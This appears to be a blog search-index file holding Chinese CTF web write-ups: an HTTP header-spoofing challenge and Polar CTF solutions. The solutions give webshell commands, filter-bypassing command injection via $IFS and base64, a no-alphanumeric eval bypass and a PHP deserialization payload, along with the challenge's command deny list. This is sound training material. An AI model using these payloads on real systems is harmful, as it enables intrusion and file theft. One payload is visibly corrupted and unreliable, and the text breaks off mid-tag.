<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>CNSS [Easy] ezhttp题解</title>
    <link href="/2023/09/25/2023-09-25-CNSS_ezhttp/"/>
    <url>/2023/09/25/2023-09-25-CNSS_ezhttp/</url>
    
    <content type="html"><![CDATA[<h3 id="CNSS-Easy-ezhttp"><a href="#CNSS-Easy-ezhttp" class="headerlink" title="CNSS  [Easy] ezhttp"></a>CNSS  [Easy] ezhttp</h3><p>1.查看题目描述:<br><img src="/images/2023-9-25-cnss-ezhttp/image-20230814101917413.png" alt="image-20230814101917413"></p><p>这题考查的使http的请求，猜测可能是要对http的请求头的各个字段进行修改，则使用BP查看该网站的请求头</p><p>2.BP抓包该网站:<br><img src="/images/2023-9-25-cnss-ezhttp/image-20230814102106081.png" alt="image-20230814102106081"></p><p>查看响应的内容中，有提示:只接受CNSS请求，游览器一般的请求方式为GET和POST，这里只接受CNSS请求，说明要将GET改成CNSS:<br><img src="/images/2023-9-25-cnss-ezhttp/image-20230814102241202.png" alt="image-20230814102241202"></p><p>发现得到不同的响应结果:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">只能在安卓微信内置浏览器中请求<br></code></pre></td></tr></table></figure><p>User-Agent:<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/User-Agent">User-Agent - HTTP | MDN (mozilla.org)</a></p><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814102841034.png" alt="image-20230814102841034"></p><p>语法:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">User-Agent: &lt;product&gt; / &lt;product-version&gt; &lt;comment&gt;<br></code></pre></td></tr></table></figure><p>浏览器通常使用的格式为：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">User-Agent: Mozilla/&lt;version&gt; (&lt;system-information&gt;) &lt;platform&gt; (&lt;platform-details&gt;) &lt;extensions&gt;<br></code></pre></td></tr></table></figure><p>指令:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs txt">&lt;product&gt;<br>产品识别码。<br><br>&lt;product-version&gt;<br>产品版本号。<br><br>&lt;comment&gt;<br>零个或多个关于组成产品信息的注释。<br></code></pre></td></tr></table></figure><p>以火狐的UA为例:</p><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814103215869.png" alt="image-20230814103215869"></p><p>示例:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0<br>Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Gecko/20100101 Firefox/42.0<br></code></pre></td></tr></table></figure><p>所以UA是用于表示该网页内容通过什么浏览器和设备进行访问的</p><p>由题目提示得:只能在安卓微信内置浏览器中请求.</p><p>所以我们得构造一个UA让其变为安卓微信内置浏览器中请求:<br>payload（通用）:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">User-Agent: Mozilla/5.0 (Linux; Android 10; XXX Build/QKQ1.190910.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36 MicroMessenger/8.0.0.1920(0x2800004D) Process/appbrand2 WeChat/arm32<br></code></pre></td></tr></table></figure><p>得到响应结果:</p><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814103557930.png" alt="image-20230814103557930"></p><p>得到提示:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">只接受来自cnss.io的请求<br></code></pre></td></tr></table></figure><p>Referer：<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Referer">Referer - HTTP | MDN (mozilla.org)</a></p><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814104023049.png" alt="image-20230814104023049"></p><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814104054349.png" alt="image-20230814104054349"></p><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814104124465.png" alt="image-20230814104124465"></p><p>所以该headers字段表示的是当前页面的是通过哪个源页面中的链接进行访问的，提示得只接受来自cnss.io的请求</p><p>说明需要设置该页面的源页面为cnss.io：<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">Referer:cnss.io<br></code></pre></td></tr></table></figure><p>由于当前页面的headers中没有Referer字段所以需要手动添加该字段:</p><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814104519850.png" alt="image-20230814104519850"></p><p>得到提示:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">只接受来自本机的请求<br></code></pre></td></tr></table></figure><p>X-Forwarded-For:<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/X-Forwarded-For">X-Forwarded-For - HTTP | MDN (mozilla.org)</a></p><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814104909323.png" alt="image-20230814104909323"></p><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814105227509.png" alt="image-20230814105227509"></p><p>实例：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs txt">X-Forwarded-For: 2001:db8:85a3:8d3:1319:8a2e:370:7348<br><br>X-Forwarded-For: 203.0.113.195<br><br>X-Forwarded-For: 203.0.113.195, 2001:db8:85a3:8d3:1319:8a2e:370:7348<br><br>X-Forwarded-For: 203.0.113.195,2001:db8:85a3:8d3:1319:8a2e:370:7348,150.172.238.178<br></code></pre></td></tr></table></figure><p>由提示得只接受来自本机的请求，所以表示该页面的客户端IP地址需要是本机的IP地址即:127.0.0.1</p><p>所以可以伪造X-Forwarded-For的内容为本机地址:</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">X-Forwarded-For:127.0.0.1<br></code></pre></td></tr></table></figure><p>响应结果:</p><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814105841408.png" alt="image-20230814105841408"></p><p>得到提示:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">只接受内容类型为application/json的请求<br></code></pre></td></tr></table></figure><p>Content-Type:<br><img src="/images/2023-9-25-cnss-ezhttp/image-20230814110543771.png" alt="image-20230814110543771"></p><p>所以由提示得浏览器的发送内容的类型为:application&#x2F;json</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">Content-Type: application/json<br></code></pre></td></tr></table></figure><p>响应结果:</p><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814110832040.png" alt="image-20230814110832040"></p><p>得到提示:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">你倒是发个json过来啊<br></code></pre></td></tr></table></figure><p>json数据:<a href="https://zhuanlan.zhihu.com/p/74151127">JSON数据格式详解 - 知乎 (zhihu.com)</a>:</p><p>基本形式:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;obj1&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;value1&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;obj2&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;123456&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-comment">//数值也需要加引号</span><br>    <span class="hljs-attr">&quot;obj3&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-comment">//嵌套型</span><br>        <span class="hljs-attr">&quot;obj4&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;value2&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;obj5&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;value3&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>根据提示需要传送一个json数据，由于该游览器的请求为CNSS所以我们不知道该在哪里传输json数据，猜测该请求的传送数据格式和POST类似:</p><p>构造payload:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;hacker&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;admin&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>响应结果:</p><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814111723058.png" alt="image-20230814111723058"></p><p>得到提示:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">能告诉我你的名字(name)吗？<br></code></pre></td></tr></table></figure><p>由于headers中不存在name字段，所以该字段需要我们通过json进行传输:<br>payload:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;admin&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>响应结果:</p><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814112529893.png" alt="image-20230814112529893"></p><p>得到提示:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">能告诉我你的密码(password)吗？<br></code></pre></td></tr></table></figure><p>说明还需要传输一个password字段的值:</p><p>payload:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;admin&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;123456&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>响应结果:</p><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814112928181.png" alt="image-20230814112928181"></p><p>根据提示我们需要在Cookie中写上name字段的值,保险起见与json中的内容一致:</p><p>Cookie:<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Cookie">Cookie - HTTP | MDN (mozilla.org)</a></p><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814113511260.png" alt="image-20230814113511260"></p><p>语法:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">Cookie: &lt;cookie-list&gt;<br>Cookie: name=value<br>Cookie: name=value; name2=value2; name3=value3<br></code></pre></td></tr></table></figure><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814113558180.png" alt="image-20230814113558180"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">Cookie:name=&quot;admin&quot;<br></code></pre></td></tr></table></figure><p>响应结果:</p><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814113202256.png" alt="image-20230814113202256"></p><p>根据提示需要在Cookie中添加password字段:</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">Cookie:name=&quot;admin&quot;;password=&quot;123456&quot;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814113321059.png" alt="image-20230814113321059"></p><p>BasicAuth认证<a href="https://zhuanlan.zhihu.com/p/64584734">秒懂HTTP基本认证(Basic Authentication) - 知乎 (zhihu.com)</a>：</p><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814123944756.png" alt="image-20230814123944756"></p><p>根据提示得我们需要进行BasicAuth认证，即认证我们输入的用户名和密码,需要添加Authorization字段:</p><p>admin:123456的base64格式为YWRtaW46MTIzNDU2</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">Authorization: Basic YWRtaW46MTIzNDU2<br></code></pre></td></tr></table></figure><p>响应结果:</p><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814124235654.png" alt="image-20230814124235654"></p><p>flag &#x3D; cnss{y0u_kn0w_h77p_r3qu3st_h4h4!}</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Polar秋季个人赛WEB_WP</title>
    <link href="/2023/09/24/2023-09-24-polar%E7%A7%8B%E5%AD%A3%E4%B8%AA%E4%BA%BA%E8%B5%9B/"/>
    <url>/2023/09/24/2023-09-24-polar%E7%A7%8B%E5%AD%A3%E4%B8%AA%E4%BA%BA%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h1 id="Polar秋季个人赛WEB-WP"><a href="#Polar秋季个人赛WEB-WP" class="headerlink" title="Polar秋季个人赛WEB_WP"></a>Polar秋季个人赛WEB_WP</h1><h4 id="ezupload"><a href="#ezupload" class="headerlink" title="ezupload:"></a>ezupload:</h4><p><img src="/images/2023-9-24-Polar/image-20230923092810825.png" alt="image-20230923092810825"></p><p>url:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">http://2469cefa-72d1-4f8f-a274-87b44a1cc826.www.polarctf.com:8090/uploads/pass1.php<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">pass=system(&#x27;cat ../flag.php&#x27;);<br></code></pre></td></tr></table></figure><p><img src="/images/2023-9-24-Polar/image-20230923092840078.png" alt="image-20230923092840078"></p><h4 id="再来ping一波啊"><a href="#再来ping一波啊" class="headerlink" title="再来ping一波啊"></a>再来ping一波啊</h4><p>payload:</p><p>base64绕过法格式:使用$IFS$9代替空格，sh代替bash</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">127.0.0.1|echo$IFS$9Y2F0IC4vaW5kZXgucGhw|base64$IFS$9-d|sh<br></code></pre></td></tr></table></figure><p>dir &#x2F;</p><p><img src="/images/2023-9-24-Polar/image-20230923101128445.png" alt="image-20230923101128445"></p><p>dir ..&#x2F;..&#x2F;:<br><img src="/images/2023-9-24-Polar/image-20230923101348330.png" alt="image-20230923101348330"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">127.0.0.1|dir<br></code></pre></td></tr></table></figure><p><img src="/images/2023-9-24-Polar/image-20230923102308231.png" alt="image-20230923102308231"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">127.0.0.1|echo cat ./index.php|base64 -d|bash<br>=&gt;使用base64绕过法<br>127.0.0.1|echo$IFS$9Y2F0IC4vaW5kZXgucGhw|base64$IFS$9-d|sh<br></code></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">127.0.0.1|dir$IFS$9..:返回上一级目录<br></code></pre></td></tr></table></figure><p><img src="/images/2023-9-24-Polar/image-20230923101845558.png" alt="image-20230923101845558"></p><p>查看网页源代码:</p><p><img src="/images/2023-9-24-Polar/image-20230923101955812.png" alt="image-20230923101955812"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>PolarD&amp;N CTF<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;margin-top: 300&quot;</span>&gt;</span>来做个复习<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;get&quot;</span> &gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;ip&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;Why not try bjut.edu.cn&quot;</span> <span class="hljs-attr">required</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;margin-left:20;&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;</span>确定<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>PolarD&amp;N CTF<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;margin-top: 300&quot;</span>&gt;</span>来做个复习<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;get&quot;</span> &gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;ip&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;Why not try bjut.edu.cn&quot;</span> <span class="hljs-attr">required</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;margin-left:20;&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;</span>确定<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-meta">    $flag = &#x27;flag&#123;ae5eb824ef87499f644c3f11a7176157&#125;&#x27;;</span><br><span class="hljs-meta">if(isset($_GET[&#x27;ip&#x27;]))&#123;</span><br><span class="hljs-meta">$ip = $_GET[&#x27;ip&#x27;];</span><br><span class="hljs-meta">if(preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|\&gt;|`|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match))&#123;</span><br><span class="hljs-meta">print_r($match);</span><br><span class="hljs-meta">print($ip);</span><br><span class="hljs-meta">echo &quot;&lt;pre&gt;&quot;;</span><br><span class="hljs-meta">echo preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match);</span><br><span class="hljs-meta">die(&quot;fxck your symbol!&quot;);</span><br><span class="hljs-meta">&#125;</span><br><span class="hljs-meta">else if(preg_match(&quot;/ /&quot;, $ip))&#123;</span><br><span class="hljs-meta">die(&quot;空格我可没加难度这可真是复习，/斜眼笑&quot;);</span><br><span class="hljs-meta">&#125;</span><br><span class="hljs-meta">else if(preg_match(&quot;/bash/&quot;, $ip))&#123;</span><br><span class="hljs-meta">die(&quot;Bash is not allowed&quot;);</span><br><span class="hljs-meta">&#125;</span><br><span class="hljs-meta">else if(preg_match(&quot;/ls/&quot;, $ip))&#123;</span><br><span class="hljs-meta">die(&quot;我很抱歉，其实你得再研究研究&quot;);</span><br><span class="hljs-meta">&#125;</span><br><span class="hljs-meta">        else if(preg_match(&quot;/cat|tac|sort|head|tail|more|less/&quot;, $ip))&#123;</span><br><span class="hljs-meta">die(&quot;常用的读取命令肯定不行，你要是想出绕过的也算你厉害。但过滤机制是改了的-。-，你再研究研究？&quot;);</span><br><span class="hljs-meta">&#125;</span><br><span class="hljs-meta">else if(preg_match(&quot;/rm/&quot;, $ip))&#123;</span><br><span class="hljs-meta">die(&quot;你要搞我？？？&quot;);</span><br><span class="hljs-meta">&#125;</span><br><span class="hljs-meta">else if(preg_match(&quot;/index/&quot;,$ip))&#123;</span><br><span class="hljs-meta">die(&quot;那能让你直接读？&quot;);</span><br><span class="hljs-meta">&#125;</span><br><span class="hljs-meta">$a = system(&quot;ping -c 4 &quot;.$ip);</span><br><span class="hljs-meta">echo &quot;&lt;pre&gt;&quot;;</span><br><span class="hljs-meta">print_r($a);</span><br><span class="hljs-meta">&#125;</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">&lt;!--其实就是出题人太懒了--&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><br><br><br><br><br><br><span class="hljs-tag">&lt;<span class="hljs-name">pre</span>&gt;</span><span class="hljs-comment">&lt;!--其实就是出题人太懒了--&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="wu"><a href="#wu" class="headerlink" title="wu:"></a>wu:</h4><p>代码审计：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-comment">//无数字字母绕过</span><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="hljs-variable">$a</span>))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no!&quot;</span>);<br>&#125;<br>@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs txt">GET:<br>?a=%24_%3D%5B%5D%3B%24_%3D%40%22%24_%22%3B%24_%3D%24_%5B&#x27;!&#x27;%3D%3D&#x27;%40&#xx27;_&#xbr><br>POST:<br>_=system(&#x27;ls ./&#x27;);<br></code></pre></td></tr></table></figure><p><img src="/images/2023-9-24-Polar/image-20230923131600566.png" alt="image-20230923131600566"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs txt">GET:<br>?a=%24_%3D%5B%5D%3B%24_%3D%40%22%24_%22%3B%24_%3D%24_%5B&#x27;!&#x27;%3D%3D&#x27;%40&#xx27;_&#xbr><br>POST:<br>_=system(&#x27;cat ./zheshiflag.php &#x27;);<br></code></pre></td></tr></table></figure><p><img src="/images/2023-9-24-Polar/image-20230923131710886.png" alt="image-20230923131710886"></p><h4 id="php-very-nice"><a href="#php-very-nice" class="headerlink" title="php very nice:"></a>php very nice:</h4><p>构造序列化字符串:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Example</span></span><br><span class="hljs-class"> </span>&#123;<br>     <span class="hljs-keyword">public</span> <span class="hljs-variable">$sys</span>=<span class="hljs-string">&#x27;Can you find the leak?&#x27;</span>;<br>     <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>         <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;sys);<br>     &#125;<br> &#125;<br><span class="hljs-variable">$obj</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Example</span>();<br><span class="hljs-variable">$obj</span>-&gt;sys = <span class="hljs-string">&quot;system(&#x27;cat ./flag.php&#x27;);&quot;</span>;<br><span class="hljs-variable">$obj</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$obj</span>);<br><span class="hljs-variable">$obj</span> = <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$obj</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$obj</span>;<br><br> <span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?a=O%3A7%3A%22Example%22%3A1%3A%7Bs%3A3%3A%22sys%22%3Bs%3A25%3A%22system%28%27cat+.%2Fflag.php%27%29%3B%22%3B%7D<br></code></pre></td></tr></table></figure><p><img src="/images/2023-9-24-Polar/image-20230923162344694.png" alt="image-20230923162344694"></p><h4 